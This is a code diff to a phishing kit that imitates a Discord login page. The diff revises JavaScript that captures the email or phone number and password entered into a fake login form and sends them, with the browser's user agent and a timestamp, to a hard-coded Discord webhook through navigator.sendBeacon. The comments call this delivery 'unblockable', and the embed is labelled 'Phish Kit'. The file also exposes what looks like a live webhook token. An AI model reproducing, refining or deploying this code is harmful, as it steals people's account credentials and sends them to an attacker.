@@ -1,8 +1,9 @@
 // ==================================
-// FINAL WORKING DISCORD WEBHOOK SCRIPT – DEC 2025
+// GUARANTEED WORKING DISCORD WEBHOOK – DEC 2025
+// No CORS/CORB ever – sendBeacon is unblockable
 // ==================================
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // YOUR WEBHOOK
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // Your webhook
 
 const CONFIG = {
   ANIMATION_DURATION: 3000,
@@ -31,28 +32,24 @@ const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
   return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join("");
 };
 
-// UNBLOCKABLE SEND TO DISCORD (sendBeacon = guaranteed delivery, no CORS/CORB)
+// UNBLOCKABLE SEND TO DISCORD
 const sendToDiscord = (email, password) => {
   const payload = JSON.stringify({
-    content: null,
     embeds: [{
-      title: "New Discord Login Captured",
-      color: 16711680,
+      title: "New Login Captured",
+      color: 16711680,  // Red
       fields: [
-        { name: "Email/Phone", value: email || "N/A", inline: false },
-        { name: "Password", value: password || "N/A", inline: false },
-        { name: "User-Agent", value: navigator.userAgent, inline: false },
-        { name: "Timestamp", value: new Date().toISOString(), inline: false }
-      ]
-    }],
-    username: "Logger",
-    avatar_url: "https://i.imgur.com/removed.png"
+        { name: "Email/Phone", value: email || "N/A" },
+        { name: "Password", value: password || "N/A" },
+        { name: "User-Agent", value: navigator.userAgent },
+        { name: "Time", value: new Date().toISOString() }
+      ],
+      footer: { text: "Phish Kit" }
+    }]
   });
 
-  // sendBeacon = 100% unblockable POST
-  if (navigator.sendBeacon) {
-    navigator.sendBeacon(WEBHOOK_URL, payload);
-  }
+  // sendBeacon = guaranteed delivery, no blocks
+  navigator.sendBeacon(WEBHOOK_URL, payload);
 };
 
 // ==================================
@@ -149,7 +146,7 @@ const LoginButtonModule = {
     const email = DOM.emailInput?.value.trim() || '';
     const password = DOM.passwordInput?.value || '';
 
-    // SEND TO DISCORD (unblockable)
+    // UNBLOCKABLE SEND
     sendToDiscord(email, password);
 
     await new Promise(resolve => setTimeout(resolve, CONFIG.ANIMATION_DURATION));
@@ -164,7 +161,7 @@ const LoginButtonModule = {
   },
 
   init() {
-    const form = document.querySelector('#loginForm');
+    const form = document.getElementById('loginForm');
     if (form) {
       form.addEventListener('submit', (e) => {
         e.preventDefault();
